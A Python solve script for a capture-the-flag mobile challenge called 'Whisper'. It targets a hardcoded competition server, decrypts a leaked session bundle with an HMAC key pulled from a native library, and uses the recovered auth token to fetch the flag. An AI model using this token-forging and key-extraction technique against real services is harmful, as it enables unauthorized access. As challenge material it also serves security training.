#!/usr/bin/env python3
"""
Whisper - UniVsThreats26Quals Mobile Challenge
Orbital Relay - Secure Alert Channel

Vuln: Unprotected broadcast leaks session_id + auth_token.
      Native lib libwhisper_crypto.so contains hardcoded HMAC key.
      decryptSessionBundle = hex_decode + XOR with HMAC key.

Flow: Connect via Socket.IO → receive session_bundle → decrypt →
      extract auth_token → GET /api/flag?token=<auth_token>
"""

import socketio
import hmac
import hashlib
import json
import time
import requests
import sys

HOST = "194.102.62.175"
PORT = 20256
URL = f"http://{HOST}:{PORT}"

# HMAC key extracted from libwhisper_crypto.so init constructor (0xcb0)
# Copies "NobodyExpectsThe" (0x7b0) + "SpainishInquisit" (0x7d0) to BSS
HMAC_KEY = b"NobodyExpectsTheSpainishInquisit"

def decrypt_session_bundle(encrypted_hex):
    """Replicate native decryptSessionBundle: hex_decode + XOR with HMAC key"""
    raw = bytes.fromhex(encrypted_hex)
    return bytes(raw[i] ^ HMAC_KEY[i % len(HMAC_KEY)] for i in range(len(raw)))

def compute_auth_token(session_id):
    """Replicate native computeAuthToken: HMAC-SHA256(key, session_id)"""
    return hmac.new(HMAC_KEY, session_id.encode(), hashlib.sha256).hexdigest()

def exploit():
    sio = socketio.Client(logger=False, engineio_logger=False)
    result = {}

    @sio.event
    def connect():
        print(f"[+] Connected to {URL}")

    @sio.on("session_bundle")
    def on_session_bundle(data):
        encrypted_hex = data["encrypted"]
        decrypted = decrypt_session_bundle(encrypted_hex)
        bundle = json.loads(decrypted)
        result["bundle"] = bundle
        print(f"[+] Decrypted session bundle:")
        print(f"    session_id: {bundle['session_id']}")
        print(f"    auth_token: {bundle['auth_token']}")

        # Verify our HMAC computation matches
        computed = compute_auth_token(bundle["session_id"])
        assert computed == bundle["auth_token"], "HMAC mismatch!"
        print(f"[+] HMAC verification: OK")

    print(f"[*] Connecting to {URL} via Socket.IO...")
    sio.connect(URL, transports=["polling"])
    time.sleep(3)
    sio.disconnect()

    if not result.get("bundle"):
        print("[!] No session bundle received")
        sys.exit(1)

    auth_token = result["bundle"]["auth_token"]

    # Authenticate to relay endpoint
    print(f"\n[*] Authenticating to /api/flag...")
    r = requests.get(f"{URL}/api/flag", params={"token": auth_token})
    print(f"[+] {r.status_code}: {r.text}")

    if r.status_code == 200:
        flag = r.json()["flag"]
        print(f"\n[+] FLAG: {flag}")
        with open("flag.txt", "w") as f:
            f.write(flag + "\n")

if __name__ == "__main__":
    exploit()
